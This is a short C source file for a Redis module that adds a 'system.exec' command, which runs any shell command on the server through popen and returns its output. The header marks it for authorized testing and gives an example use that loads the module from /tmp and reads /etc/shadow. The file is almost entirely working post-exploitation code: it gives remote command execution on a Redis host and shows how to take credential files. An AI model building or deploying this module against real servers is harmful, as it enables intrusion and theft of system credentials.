/*
 * system.c — minimal Redis module exposing one command:
 *
 *   system.exec "<shell command>"
 *
 * The command's stdout is captured and returned to the caller as a bulk-string
 * reply, suffixed with the exit code on the last line so debuggers can tell
 * crashes apart from output.
 *
 * Authorized testing only. Build with:  make
 *
 * Use:
 *   redis-cli MODULE LOAD /tmp/system.so
 *   redis-cli system.exec "id; uname -a; cat /etc/shadow"
 *   redis-cli MODULE UNLOAD system
 */

#define _GNU_SOURCE
#include "redismodule.h"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>

#define MAX_BUF (1024 * 1024)  /* 1 MB output cap */

static int SystemExec_Cmd(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 2) return RedisModule_WrongArity(ctx);

    size_t cmd_len = 0;
    const char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);
    if (!cmd || cmd_len == 0) {
        return RedisModule_ReplyWithError(ctx, "ERR empty command");
    }

    /* popen -> read up to MAX_BUF -> wrap into bulk reply */
    FILE *fp = popen(cmd, "r");
    if (!fp) {
        char err[256];
        snprintf(err, sizeof(err), "ERR popen failed: %s", strerror(errno));
        return RedisModule_ReplyWithError(ctx, err);
    }

    char *buf = (char *)RedisModule_Alloc(MAX_BUF + 256);
    if (!buf) {
        pclose(fp);
        return RedisModule_ReplyWithError(ctx, "ERR oom");
    }

    size_t total = 0;
    size_t n;
    while ((n = fread(buf + total, 1, MAX_BUF - total, fp)) > 0) {
        total += n;
        if (total >= MAX_BUF) break;
    }
    int rc = pclose(fp);
    if (WIFEXITED(rc)) rc = WEXITSTATUS(rc);

    /* Append exit-code marker (caller can split on "\n--exit:") */
    int extra = snprintf(buf + total, 256, "\n--exit:%d\n", rc);
    if (extra > 0) total += (size_t)extra;

    RedisModule_ReplyWithStringBuffer(ctx, buf, total);
    RedisModule_Free(buf);
    return REDISMODULE_OK;
}

/* Module entry point — name "system", apiver 1 */
int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    (void)argv; (void)argc;
    if (RedisModule_Init(ctx, "system", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    if (RedisModule_CreateCommand(ctx, "system.exec", SystemExec_Cmd,
                                  "readonly", 0, 0, 0) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    return REDISMODULE_OK;
}
